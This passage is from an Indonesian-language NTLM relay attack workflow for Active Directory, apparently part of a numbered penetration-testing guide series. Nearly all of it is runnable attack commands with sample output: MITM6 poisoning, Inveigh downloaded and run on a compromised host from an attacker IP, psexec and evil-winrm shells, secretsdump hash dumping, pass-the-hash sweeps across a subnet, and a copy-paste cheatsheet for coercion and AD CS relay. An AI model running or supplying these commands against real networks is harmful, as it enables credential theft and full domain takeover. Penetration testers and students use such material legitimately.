sudo mitm6 -d "$DOMAIN"
```

**OUTPUT BERHASIL ✅ — MITM6 aktif:**

text

```
Starting mitm6 using the following configuration:
Primary adapter: tun0
IPv6 address: fe80::1
DNS local search domain: corp.local
DNS allowlist: corp.local
[*] Sent spoofed reply for wpad.corp.local to fe80::abc:def
```

**OUTPUT BERHASIL ✅ — Authentication tertangkap via IPv6:**

text

```
[*] HTTPD(80): Connection from ::ffff:10.10.11.200
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Serving WPAD authentication
[*] HTTPD(80): Authenticating against ldap://10.10.11.10 as CORP\WORKSTATION$
[*] LDAP bind successful
```

**OUTPUT GAGAL ❌ — Tidak ada IPv6 traffic:**

text

```
(diam, tidak ada connection)
```

➡️ Network tidak menggunakan IPv6 secara aktif, atau DHCPv6 protection aktif. MITM6 tidak efektif di sini. Fallback ke Fase 7 (Inveigh) atau fokus ke metode lain.

---

## ═══════════════════════════════════════

## FASE 7: INVEIGH (Dari Windows Foothold)

## ═══════════════════════════════════════

> **Gunakan Fase ini jika:** Sudah punya Windows foothold dan mau capture dari dalam

### Langkah 7.1 — Deploy Inveigh

PowerShell

```
# Di Windows target yang sudah dikompromis

# Step 1: Bypass execution policy
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Step 2: Download Inveigh
# Option A: Download langsung (jika ada internet)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')

# Option B: Transfer dari attacker machine
# Di Parrot: python3 -m http.server 8080
# Di Windows:
Invoke-WebRequest -Uri "http://$ATTACKER_IP:8080/Inveigh.ps1" -OutFile C:\Windows\Temp\Inveigh.ps1
Import-Module C:\Windows\Temp\Inveigh.ps1

# Step 3: Jalankan
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -FileOutput Y

# Step 4: Monitor capture (jalankan di terminal lain)
Get-InveighLog | Select-String "NTLMv2"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Inveigh started at 2024/01/01 12:00:00
[+] LLMNR/NBT-NS Spoofer running
[+] HTTP Capture running on port 80
[+] SMB Capture running on port 445

[SMB] NTLMv2 captured: diana::CORP:1122...:a1b2...:0101...
```

PowerShell

```
# Hentikan setelah capture
Stop-Inveigh

# Ambil hash
Get-InveighLog | Select-String "NTLMv2" | Out-File C:\Windows\Temp\captured.txt
```

Bash

```
# Di Parrot: download hash file dan crack
scp user@$TARGET:'C:\Windows\Temp\captured.txt' ~/ntlm_relay/creds/
hashcat -m 5600 ~/ntlm_relay/creds/captured.txt /usr/share/wordlists/rockyou.txt
```

---

## ═══════════════════════════════════════

## FASE 8: POST-EXPLOITATION

## ═══════════════════════════════════════

> **Masuk sini jika:** Sudah dapat credentials, hashes, atau TGT dari fase sebelumnya

### Langkah 8.1 — Eksekusi Shell dengan Credentials

Bash

```
# Method 1: PsExec (paling reliable, butuh local admin)
impacket-psexec "CORP/Administrator:Password123!@$TARGET"
impacket-psexec "Administrator@$TARGET" -hashes "$NTLM_HASH"

# Method 2: WMIExec (lebih stealth)
impacket-wmiexec "CORP/Administrator:Password123!@$TARGET"
impacket-wmiexec "Administrator@$TARGET" -hashes "$NTLM_HASH"

# Method 3: SMBExec (paling stealth, tidak upload binary)
impacket-smbexec "CORP/Administrator:Password123!@$TARGET"

# Method 4: Evil-WinRM (jika port 5985 open)
nxc winrm $TARGET -u "Administrator" -p "Password123!" 
evil-winrm -i $TARGET -u "Administrator" -p "Password123!"
evil-winrm -i $TARGET -u "Administrator" -H "fc525c9683e8fe067095ba2ddc971881"

# Method 5: Kerberos ticket
export KRB5CCNAME="dc01$.ccache"
impacket-psexec -k -no-pass "$DOMAIN/Administrator@DC01.$DOMAIN"
```

**OUTPUT BERHASIL ✅ — Shell PsExec:**

text

```
[*] Requesting shares on 10.10.11.200
[*] Found writable share ADMIN$
[*] Uploading file payload.exe
[*] Created \payload.exe service
C:\Windows\system32> whoami
nt authority\system
```

**OUTPUT BERHASIL ✅ — Shell Evil-WinRM:**

text

```
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

### Langkah 8.2 — Dump Hashes untuk Lateral Movement

Bash

```
# Dump semua hashes dari target
impacket-secretsdump "Administrator:Password123!@$TARGET"
impacket-secretsdump "Administrator@$TARGET" -hashes "$NTLM_HASH"

# Dengan Kerberos
export KRB5CCNAME="admin.ccache"
impacket-secretsdump -k -no-pass "$DOMAIN/Administrator@$TARGET"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x...

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::

[*] Dumping cached domain logon information
CORP\diana:$DCC2$10240#diana#...

[*] Dumping LSA Secrets
CORP\svc_backup:Backup2023!

[*] DPAPI_SYSTEM
dpapi_machinekey: ...
```

Bash

```
# Simpan semua hashes
impacket-secretsdump "Administrator:Password123!@$TARGET" | tee ~/ntlm_relay/creds/all_hashes.txt

# Test hashes ke semua host di network
nxc smb 10.10.11.0/24 -u "Administrator" -H "fc525c9683e8fe067095ba2ddc971881" --local-auth
```

---

### Langkah 8.3 — Kumpulkan Info untuk Pivot

Bash

```
# Di dalam shell Windows:
# 1. Lihat network
ipconfig /all
arp -a
net view /domain

# 2. Lihat siapa yang logged in
net session
query user

# 3. Cek shares yang bisa diakses
net use \\DC01\C$ /user:Administrator Password123!
net view \\DC01\

# 4. Cek service yang jalan
net start
sc query type= all

# Di Linux shell:
# Cek koneksi aktif (potential pivot targets)
ss -tunp
arp -n
cat /etc/hosts
```

➡️ Setiap IP baru yang ditemukan = potential pivot target  
➡️ Lanjut ke `[🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement)`  
➡️ Jika sudah DA → lanjut ke `<a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>`

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`Address already in use`|Port 445/80 occupied|`sudo ss -ltnp \| grep ':445'` lalu kill proses|
|`STATUS_ACCESS_DENIED`|Relay sukses tapi bukan admin|Coba target lain, atau pivot ke LDAP relay|
|`STATUS_LOGON_FAILURE`|Authentication gagal di target|Cek signing, username/domain, NTLM support|
|`strongerAuthRequired`|LDAP Signing enforced|Coba LDAPS atau AD CS relay|
|Responder captures, ntlmrelayx tidak terima|Responder SMB masih On|Set `SMB = Off` di Responder.conf|
|Tidak ada traffic ke ntlmrelayx|Poisoning tidak bekerja atau tidak ada victim|Trigger manual dengan coercion|
|`KRB_AP_ERR_SKEW`|Clock tidak sync|`sudo ntpdate -u $DC_IP`|
|Certificate issued tapi PKINIT gagal|PKINIT tidak dikonfigurasi|Coba `certipy auth` dengan `-ldap-shell`|
|Relay sukses tapi No SAM dump|User direlay bukan local admin|Pivot ke LDAP relay untuk AD modification|
|Coercion tidak trigger|Service disabled / firewall / patch|Coba primitive lain (PetitPotam → PrinterBug → DFSCoerce → Coercer)|
|MITM6 tidak ada traffic|IPv6 tidak aktif / DHCPv6 protected|Cek `ip -6 addr`, ganti strategi|
|`ntlmrelayx` langsung exit|Missing dependency / arg invalid|Jalankan `ntlmrelayx.py --help`|
|Net-NTLMv2 tidak crack|Password kuat|PTH tidak bisa, relay langsung saja|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE

## ═══════════════════════════════════════

text

```
START: Berada di AD Environment / Network Windows
│
├─ FASE 0: Recon Signing Status
│   ├─ SMB signing: False → FASE 2 (SMB Relay) ← PILIHAN UTAMA
│   ├─ SMB signing: True
│   │   ├─ LDAP signing: Not Enforced → FASE 4 (LDAP Relay)
│   │   ├─ AD CS Web Enrollment ada → FASE 5 (ESC8 Relay)
│   │   ├─ IPv6 aktif → FASE 6 (MITM6)
│   │   └─ Semua blocked → FASE 3 (Capture + Crack)
│   └─ Punya Windows foothold → FASE 7 (Inveigh)
│
├─ FASE 2: SMB→SMB Relay
│   ├─ SAM dump berhasil → PTH → Shell → FASE 8
│   ├─ Relay sukses, bukan admin → FASE 4 (LDAP Relay)
│   └─ Relay gagal → FASE 3 atau FASE 4
│
├─ FASE 3: Responder Capture
│   ├─ Hash di-crack → Validate creds → FASE 8
│   └─ Tidak crack → Simpan, cari info lain
│
├─ FASE 4: LDAP Relay
│   ├─ Escalate user → Domain Admin → FASE 8
│   ├─ RBCD → ke <a href="/docs/ad-delegation" class="text-[#00b4d8] hover:underline font-mono font-semibold">39_ad_delegation_workflow.md</a>
│   ├─ Shadow Creds → TGT → FASE 8
│   └─ LDAP signing enforced → FASE 5
│
├─ FASE 5: AD CS Relay (ESC8)
│   ├─ Certificate issued → TGT → DCSync → FASE 8
│   └─ PKINIT gagal → coba ldap-shell
│
├─ FASE 6: MITM6
│   ├─ Authentication tertangkap → ke FASE 4 (relay via IPv6)
│   └─ Tidak ada traffic → ganti strategi
│
└─ FASE 8: Post-Exploitation
    ├─ Shell didapat → Dump hashes → Pivot
    ├─ Temukan IP baru → <a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>
    └─ DA tercapai → <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>
```

---

## CROSS-SERVICE: Credentials dari NTLM Relay → Test Kemana

Bash

```
# Setiap kali dapat credentials dari relay, test ke semua service ini:
export USER="diana"; export PASS="Welcome2023!"
export HASH="aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881"

# SMB (port 445)
nxc smb $TARGET -u "$USER" -p "$PASS"                    # → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>

# WinRM (port 5985)
nxc winrm $TARGET -u "$USER" -p "$PASS"                  # → evil-winrm

# SSH (port 22)
nxc ssh $TARGET -u "$USER" -p "$PASS"                    # → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>

# RDP (port 3389)
nxc rdp $TARGET -u "$USER" -p "$PASS"                    # → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>

# MSSQL (port 1433)
nxc mssql $TARGET -u "$USER" -p "$PASS"                  # → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>

# LDAP / AD
nxc ldap $DC_IP -u "$USER" -p "$PASS"                    # → <a href="/docs/ldap" class="text-[#00b4d8] hover:underline font-mono font-semibold">11_ldap_workflow.md</a>

# AD Kerberoasting
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -request    # → 37_kerberoasting

# AD BloodHound
bloodhound-python -u "$USER" -p "$PASS" -ns $DC_IP -d $DOMAIN -c All  # → 36_ad_bloodhound
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export DC_IP="10.10.11.10"
export CA_IP="10.10.11.201"; export ATTACKER_IP="10.10.14.5"
export DOMAIN="CORP.LOCAL"; export USERNAME=""; export PASSWORD=""
export NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:NTHASHHERE"
mkdir -p ~/ntlm_relay/{loot,targets,logs,creds,certs}

# === RECON ===
nxc smb 10.10.11.0/24 --gen-relay-list ~/ntlm_relay/targets/smb_targets.txt
nxc ldap $DC_IP -u '' -p ''                               # LDAP signing check
curl -k -i "http://$CA_IP/certsrv/"                       # AD CS check

# === CONFIG RESPONDER FOR RELAY ===
sudo sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# === SMB RELAY ===
sudo ntlmrelayx.py -tf ~/ntlm_relay/targets/smb_targets.txt -smb2support -l ~/ntlm_relay/loot
sudo responder -I tun0 -rdwv

# === LDAP RELAY ===
sudo ntlmrelayx.py -t "ldap://$DC_IP" -smb2support --escalate-user "$USERNAME"
sudo ntlmrelayx.py -t "ldap://$DC_IP" -smb2support --delegate-access
sudo ntlmrelayx.py -t "ldap://$DC_IP" -smb2support --shadow-credentials

# === AD CS RELAY ===
sudo ntlmrelayx.py -t "http://$CA_IP" --adcs --template "DomainController"
certipy auth -pfx DC01.pfx -dc-ip $DC_IP

# === COERCION ===
python3 /tmp/PetitPotam/PetitPotam.py "$ATTACKER_IP" "$DC_IP"
coercer coerce -l "$ATTACKER_IP" -t "$DC_IP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN"

# === MITM6 ===
sudo mitm6 -d "$DOMAIN"
sudo ntlmrelayx.py -6 -t "ldap://$DC_IP" -smb2support --delegate-access

# === CRACKING ===
hashcat -m 5600 captured_netntlmv2.txt /usr/share/wordlists/rockyou.txt  # Net-NTLMv2
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt           # NT Hash

# === PASS-THE-HASH ===
nxc smb $TARGET -u "Administrator" -H "$NTLM_HASH"
impacket-psexec "Administrator@$TARGET" -hashes "$NTLM_HASH"
evil-winrm -i $TARGET -u "Administrator" -H "fc525c9683e8fe067095ba2ddc971881"

# === DUMP HASHES ===
impacket-secretsdump "Administrator:$PASSWORD@$TARGET"
impacket-secretsdump "Administrator@$TARGET" -hashes "$NTLM_HASH"
```

---

> **➡️ NEXT STEPS setelah NTLM Relay:**
> 
> - Dapat shell → `<a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>`
> - Dapat DA → `<a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>`
> - RBCD configured → `<a href="/docs/ad-delegation" class="text-[#00b4d8] hover:underline font-mono font-semibold">39_ad_delegation_workflow.md</a>`
> - AD CS certificate → `<a href="/docs/adcs" class="text-[#00b4d8] hover:underline font-mono font-semibold">40_adcs_workflow.md</a>`
> - Butuh BloodHound untuk target selection → `<a href="/docs/ad-bloodhound" class="text-[#00b4d8] hover:underline font-mono font-semibold">36_ad_bloodhound_workflow.md</a>`

[](https://messages-prod.27c852f3500f38c1e7786e2c9ff9e48f.r2.cloudflarestorage.com/aad5bafd-ac04-4d8f-9667-3d87b6995a58/1789141088297-41_ntlm_relay_workflow.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=b33de61d4f22a31b59b25364ab5037c5%2F20260911%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20260911T153809Z&X-Amz-Expires=3600&X-Amz-Signature=032bbdfde4eaaa97a218d3f6831bf8f08f9d4c70fd57965a5fb9b2aa1be1c920&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)